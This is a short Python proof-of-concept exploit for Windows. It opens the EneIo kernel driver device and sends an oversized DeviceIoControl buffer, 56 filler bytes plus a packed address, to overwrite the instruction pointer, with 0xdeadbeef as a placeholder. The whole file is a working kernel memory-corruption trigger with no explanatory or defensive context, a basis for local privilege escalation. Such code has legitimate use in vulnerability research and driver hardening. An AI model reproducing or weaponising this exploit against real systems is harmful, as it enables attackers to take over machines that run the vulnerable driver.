#!/usr/bin/python

from ctypes import *
import struct
import sys

kernel32 = windll.kernel32
ntdll = windll.ntdll
NULL = 0x00

def run():
    handle = kernel32.CreateFileA("\\\\.\\EneIo", 0xC0000000, 0, None, 0x3, 0, None)
    if not handle or handle == -1:
        sys.exit("[-] Error getting device handle")

    shellcode = struct.pack("<Q", 0xdeadbeef) # RIP == 0xdeadbeef
    buf = "A" * 56 + shellcode

    raw_input("Press Enter to Trigger Vuln")
    driver = kernel32.DeviceIoControl(handle, 0x80102040, buf, len(buf), NULL, NULL, 0, NULL)
    if not driver or driver == -1:
        sys.exit("[-] Error")

if __name__ == "__main__":
    run()
